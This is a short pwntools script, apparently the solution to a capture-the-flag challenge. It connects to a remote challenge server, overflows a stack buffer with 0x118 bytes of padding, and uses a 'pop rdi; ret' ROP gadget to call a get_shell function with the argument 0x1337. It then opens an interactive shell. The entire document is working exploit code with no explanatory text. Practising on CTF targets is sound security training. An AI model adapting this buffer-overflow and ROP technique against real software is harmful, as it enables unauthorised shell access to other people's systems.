from pwn import *

e = ELF("build/rop")
r = remote("ctf.isss.io", 9003)
#r = process("build/overflow")
context.terminal = ['urxvt', '-e', 'bash', '-c']

rop = ROP(e)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]

r.sendline(b'a'*0x118 + p64(POP_RDI) + p64(0x1337) + p64(e.symbols['get_shell']))
r.interactive()
